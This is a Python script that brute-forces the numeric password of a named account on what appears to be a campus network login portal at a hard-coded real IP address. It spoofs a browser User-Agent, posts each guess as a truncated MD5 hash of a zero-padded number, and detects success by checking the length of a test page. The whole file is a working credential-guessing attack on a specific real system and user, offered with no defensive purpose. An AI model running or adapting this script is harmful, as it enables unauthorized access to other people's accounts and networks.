import requests
import hashlib
#from bs4 import BeautifulSoup
class LoginClient(object):
    def __init__(self):
        self.headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36'}
        self.session = requests.session()
    def login(self,username,password,
              drop = '0',
              type = '1',
              n = '100'):
        login_url = 'http://210.43.32.30/cgi-bin/do_login'
        response = self.session.get(login_url)

        data = {'username':username,
                'password':password,
                'drop':drop,
                'type':type,
                'n':n}
        self.session.post(login_url,data=data,headers = self.headers)
        re = requests.get("http://www.xiqueer.com/")
        re.encoding = 'utf-8'
        return (len(str(re.text)))
if __name__ == '__main__':
    username = 'A074'
    passwordint = 1190
    passwordstr = hashlib.md5(str(passwordint).encode('utf-8')).hexdigest()[8:-8]
    D  = LoginClient()
    key = [100,200,300,400,500,600,700,800,900]
    intstr = D.login(username,passwordstr)
    while (intstr == 267 and passwordint != 999999):
        passwordint = passwordint + 1
        if passwordint < 10:
            passwordstr = '00000'+ str(passwordint)
        elif passwordint < 100:
            passwordstr = '0000'+ str(passwordint)
        elif passwordint < 1000:
            passwordstr = '000'+ str(passwordint)
        elif passwordint < 10000:
            passwordstr = '00'+ str(passwordint)
        elif passwordint < 100000:
            passwordstr = '0'+ str(passwordint)
        passwordstr = hashlib.md5(str(passwordstr).encode('utf-8')).hexdigest()[8:-8]
        intstr = D.login(username,passwordstr)
        print(passwordint)
    print(passwordint)
